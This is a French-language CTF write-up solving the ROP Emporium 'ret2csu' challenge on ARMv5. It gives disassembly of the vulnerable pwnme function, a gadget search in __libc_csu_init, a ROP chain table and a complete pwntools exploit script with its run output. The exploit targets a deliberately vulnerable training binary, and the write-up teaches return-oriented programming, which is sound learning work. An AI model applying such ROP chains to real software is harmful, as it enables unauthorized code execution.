---
Title: Ropemporium ARMv5 ret2csu
Date: 2023-06-28
Tags: [linux, python, ROP, ARMv5, ropemporium, write-up]
Categories: [tutorial]
Author: cdpointpoint
Draft: False
---

# armv5 ret2csu

## Introduction

Dans cet exercice, on doit appeller ret2win avec les paramètres convenus mais on dispose de peu de gadgets.

L'énoncé ropemporium : [ret2csu](https://ropemporium.com/challenge/ret2csu.html)

## Découverte

### Le contenu du challenge

    -rw-r--r-- 1 jce jce    32  5 juil.  2020 encrypted_flag.dat
    -rw-r--r-- 1 jce jce    32  5 juil.  2020 key.dat
    -rwxr-xr-x 1 jce jce  7928 20 juil.  2021 libret2csu_armv5-hf.so
    -rwxr-xr-x 1 jce jce  7916  6 juil.  2020 libret2csu_armv5.so
    -rwxr-xr-x 1 jce jce  8140  6 juil.  2020 ret2csu_armv5
    -rwxr-xr-x 1 jce jce  8160 20 juil.  2021 ret2csu_armv5-hf

Le challenge est proposé de nouveau sous une forme armv5 et arm-hf.

### Exécution avec qemu.

    armv5/08_ret2csu$ qemu-arm ret2csu_armv5
    ret2csu by ROP Emporium
    ARMv5

    Check out https://ropemporium.com/challenge/ret2csu.html for information on how to solve this challenge.

    > OKOK
    Thank you!

## Analyse

### Le programme principal

La fonction main appelle directement la fonction vulnérable située dans la librairie

    ┌ 24: int main (int argc, char **argv, char **envp);
    │           ; var int32_t var_4h @ sp+0x4
    │           0x000105b8      00482de9       push {fp, lr}
    │           0x000105bc      04b08de2       add fp, var_4h
    │           0x000105c0      b1ffffeb       bl sym.imp.pwnme
    │           0x000105c4      0030a0e3       mov r3, 0
    │           0x000105c8      0300a0e1       mov r0, r3
    └           0x000105cc      0088bde8       pop {fp, pc}

La fonction `usefulFunction` n'est pas appellée mais référence le fonction `ret2win`, importée de la librairie et de ce fait présente dans le PLT.

    ┌ 32: sym.usefulFunction ();
    │           ; var int32_t var_4h @ sp+0x4
    │           0x000105d0      00482de9       push {fp, lr}
    │           0x000105d4      04b08de2       add fp, var_4h
    │           0x000105d8      0320a0e3       mov r2, 3
    │           0x000105dc      0210a0e3       mov r1, 2
    │           0x000105e0      0100a0e3       mov r0, 1
    │           0x000105e4      abffffeb       bl sym.imp.ret2win
    │           0x000105e8      0000a0e1       mov r0, r0
    └           0x000105ec      0088bde8       pop {fp, pc}

Le programme ne contient pas d'autre fonctions intéressantes si ce n'est la fonction libc_csu_init qu'on va utiliser plus loin.

    ┌ 88: sym.__libc_csu_init (int32_t arg1, int32_t arg2);
    │           ; arg int32_t arg1 @ r0
    │           ; arg int32_t arg2 @ r1
    │           0x000105f0      f0472de9       push {r4, r5, r6, r7, r8, sb, sl, lr}
    │           0x000105f4      4c609fe5       ldr r6, [0x00010648]        ; [0x10648:4]=0x10900
    │           0x000105f8      4c509fe5       ldr r5, [0x0001064c]        ; [0x1064c:4]=0x108f8
    │           0x000105fc      06608fe0       add r6, pc, r6              ; 0x20f04
    │           0x00010600      05508fe0       add r5, pc, r5              ; 0x20f00
    │           0x00010604      056046e0       sub r6, r6, r5
    │           0x00010608      0070a0e1       mov r7, r0                  ; arg1
    │           0x0001060c      0180a0e1       mov r8, r1                  ; arg2
    │           0x00010610      0290a0e1       mov sb, r2
    │           0x00010614      94ffffeb       bl sym._init
    │           0x00010618      4661b0e1       asrs r6, r6, 2
    │           0x0001061c      f087bd08       popeq {r4, r5, r6, r7, r8, sb, sl, pc}
    │           0x00010620      0040a0e3       mov r4, 0
    │           ; CODE XREF from sym.__libc_csu_init @ 0x10640
    │       ┌─> 0x00010624      014084e2       add r4, r4, 1
    │       ╎   0x00010628      043095e4       ldr r3, [r5], 4             ; 0x20f00
    │       ╎                                                              ; loc.__init_array_start
    │       ╎   0x0001062c      0920a0e1       mov r2, sb
    │       ╎   0x00010630      0810a0e1       mov r1, r8
    │       ╎   0x00010634      0700a0e1       mov r0, r7
    │       ╎   0x00010638      33ff2fe1       blx r3
    │       ╎   0x0001063c      040056e1       cmp r6, r4
    │       └─< 0x00010640      f7ffff1a       bne 0x10624
    └           0x00010644      f087bde8       pop {r4, r5, r6, r7, r8, sb, sl, pc}


### La librairie


La librairie contient la fonction vulnérable :


    ┌ 180: sym.pwnme ();
    │           ; var void *buf @ fp-0x24
    │           ; var int32_t var_4h_2 @ sp+0x20
    │           ; var int32_t var_4h @ sp+0x24
    │           0x00000738      00482de9       push {fp, lr}
    │           0x0000073c      04b08de2       add fp, var_4h
    │           0x00000740      20d04de2       sub sp, sp, 0x20
    │           0x00000744      a0209fe5       ldr r2, [0x000007ec]        ; [0x7ec:4]=0x108b0
    │           0x00000748      02208fe0       add r2, pc, r2              ; 0x11000 ; " \x0f\x01"
    │           0x0000074c      9c309fe5       ldr r3, aav.0x0000004c      ; [0x7f0:4]=76
    │           0x00000750      033092e7       ldr r3, [r2, r3]            ; 0x1104c
    │                                                                      ; reloc.stdout
    │           0x00000754      000093e5       ldr r0, [r3]                ; FILE*stream
    │           0x00000758      0030a0e3       mov r3, 0
    │           0x0000075c      0220a0e3       mov r2, 2
    │           0x00000760      0010a0e3       mov r1, 0                   ; char *buf
    │           0x00000764      9effffeb       bl sym.imp.setvbuf          ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
    │           0x00000768      84309fe5       ldr r3, aav.0x000004ec      ; [0x7f4:4]=0x4ec aav.0x000004ec
    │           0x0000076c      03308fe0       add r3, pc, r3              ; 0xc60 ; "ret2csu by ROP Emporium"
    │           0x00000770      0300a0e1       mov r0, r3                  ; 0xc60 ; "ret2csu by ROP Emporium" ; const char *s
    │           0x00000774      8effffeb       bl sym.imp.puts             ; int puts(const char *s)
    │           0x00000778      78309fe5       ldr r3, aav.0x000004f4      ; [0x4f4:4]=0x316 "." ; aav.0x000004f4
    │           0x0000077c      03308fe0       add r3, pc, r3              ; 0xc78 ; "ARMv5\n"
    │           0x00000780      0300a0e1       mov r0, r3                  ; 0xc78 ; "ARMv5\n" ; const char *s
    │           0x00000784      8affffeb       bl sym.imp.puts             ; int puts(const char *s)
    │           0x00000788      24304be2       sub r3, buf
    │           0x0000078c      2020a0e3       mov r2, 0x20
    │           0x00000790      0010a0e3       mov r1, 0                   ; int c
    │           0x00000794      0300a0e1       mov r0, r3                  ; void *s
    │           0x00000798      94ffffeb       bl sym.imp.memset           ; void *memset(void *s, int c, size_t n)
    │           0x0000079c      58309fe5       ldr r3, aav.0x000004d8      ; [0x7fc:4]=0x4d8 aav.0x000004d8
    │           0x000007a0      03308fe0       add r3, pc, r3              ; 0xc80 ; "Check out https://ropemporium.com/challenge/ret2csu.html..."
    │           0x000007a4      0300a0e1       mov r0, r3                  ;
    │           0x000007a8      81ffffeb       bl sym.imp.puts             ; int puts(const char *s)
    │           0x000007ac      4c309fe5       ldr r3, aav.0x00000534      ; [0x800:4]=0x534 aav.0x00000534
    │           0x000007b0      03308fe0       add r3, pc, r3              ; 0xcec ; "> "
    │           0x000007b4      0300a0e1       mov r0, r3                  ; 0xcec ; "> " ; const char *format
    │           0x000007b8      71ffffeb       bl sym.imp.printf           ; int printf(const char *format)
    │           0x000007bc      24304be2       sub r3, buf
    │           0x000007c0      022ca0e3       mov r2, 0x200
    │           0x000007c4      0310a0e1       mov r1, r3                  ; void *buf
    │           0x000007c8      0000a0e3       mov r0, 0                   ; int fildes
    │           0x000007cc      72ffffeb       bl sym.imp.read             ; ssize_t read(int fildes, void *buf, size_t nbyte)
    │           0x000007d0      2c309fe5       ldr r3, aav.0x00000514      ; [0x804:4]=0x514 aav.0x00000514
    │           0x000007d4      03308fe0       add r3, pc, r3              ; 0xcf0 ; "Thank you!"
    │           0x000007d8      0300a0e1       mov r0, r3                  ; 0xcf0 ; "Thank you!" ; const char *s
    │           0x000007dc      74ffffeb       bl sym.imp.puts             ; int puts(const char *s)
    │           0x000007e0      0000a0e1       mov r0, r0                  ; 0xcf0 ; "Thank you!"
    │           0x000007e4      04d04be2       sub sp, var_4h_2
    └           0x000007e8      0088bde8       pop {fp, pc}

On y retrouve la valeur de l'offset de débordement (40)  ainsi que la taille max de la chaîne de ROP (512)

    │           ; var void *buf @ fp-0x24
    │           0x000007bc      24304be2       sub r3, buf
    │           0x000007c0      022ca0e3       mov r2, 0x200
    │           0x000007c4      0310a0e1       mov r1, r3                  ; void *buf
    │           0x000007c8      0000a0e3       mov r0, 0                   ; int fildes
    │           0x000007cc      72ffffeb       bl sym.imp.read             ; ssize_t read(int fildes, void *buf, size_t nbyte)



### Recherche de gadgets

Pour appeller ret2win il nous faut charger les registre r0, r1, r2

Pour r0 c'est possible.


    0x000105c8 : mov r0, r3 ; pop {fp, pc}
    0x00010474 : pop {r3, pc}

Mais pas r1 et r2.

Dans __libc_csu_init on a deux gadgets :

    0x00010644 pop {r4, r5, r6, r7, r8, sb, sl, pc}

    0x0001062c      0920a0e1       mov r2, sb
    0x00010630      0810a0e1       mov r1, r8
    0x00010634      0700a0e1       mov r0, r7
    0x00010638      33ff2fe1       blx r3

On peut avec le premier charger sb, r8 et r7.
Charger r3 avec

    0x00010474 : pop {r3, pc}

Puis enchainer sur le gadget d'appel avec `blx r3`


### La chaine de ROP



|address   | gadget | comment |
|----------|--------|------|
| 0x00010644 | pop {r4, r5, r6, r7, r8, sb, sl, pc} | Chargement des registres |
| 0 || pop r4 |
| 0 || pop r5 |
| 0 || pop r6 |
| 0xdeadbeef|| pop r7 |
| 0xcafebabe|| pop r8 |
| 0xd00df00d|| pop sb |
| 0|| pop sl |
| 0x00010474 | pop {r3, pc} | Chargement de r3 avec ret2win@plt
| 0x00010498 || Adresse de re2win dans la PLT pour r3
| 0x0001062c| mov r2, sb; mov r1, r8; mov r0, r7; blx r3| mov and call |


## Exploitation

### Script python

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

# ropemporium ARMv5 ret2csu
context.terminal=["/usr/bin/xterm", "-fa", "Monospace", "-fs","12", "-e"]
# Set up pwntools for the correct architecture
elf = context.binary = ELF('ret2csu_armv5')

# 164 : read
# 176 : ret
gs='''
b *pwnme+176
'''

# Gadgets
# pop {r4, r5, r6, r7, r8, sb, sl, pc} 
g_pop_r45678 = 0x00010644

# pop {r3, pc}
g_pop_r3 = 0x00010474

# mov r2, sb; mov r1, r8; mov r0, r7; blx r3
g_movs_blx_r3 = 0x0001062c

if len(sys.argv)>1 and sys.argv[1] == "-d":
    io = gdb.debug([elf.path],gdbscript=gs)
else:
    io = process([elf.path])

ret2win = elf.plt['ret2win']

io.recvuntil(b"> ")

offset=0x24

flagfile=b"flag.txt"

PL=b"A"*offset
# Chargement des registres r4..r10
PL+=p32(g_pop_r45678)
PL+=p32(0)               # r4
PL+=p32(0)               # r5
PL+=p32(0)               # r6
PL+=p32(0xdeadbeef)      # r7
PL+=p32(0xcafebabe)      # r8
PL+=p32(0xd00df00d)      # sb
PL+=p32(0)               # sl
# Chargement de r3 <= re2win@plt
PL+=p32(g_pop_r3)
PL+=p32(ret2win)

PL+=p32(g_movs_blx_r3)   # mov r2, sb; mov r1, r8; mov r0, r7; blx r3

io.sendline(PL)

io.recvuntil(b"ROPE")
flag=io.recvline().decode()
log.success(f"flag : ROPE{flag}")
io.close()
```

### Execution

    /w/ropemporium/armv5/08_ret2csu# python3 solve.py
    [*] '/w/ropemporium/armv5/08_ret2csu/ret2csu_armv5'
        Arch:     arm-32-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x10000)
        RUNPATH:  b'.'
    [+] Starting local process '/w/ropemporium/armv5/08_ret2csu/ret2csu_armv5': pid 159
    [+] flag : ROPE{a_placeholder_32byte_flag!}
    [*] Stopped process '/w/ropemporium/armv5/08_ret2csu/ret2csu_armv5' (pid 159)
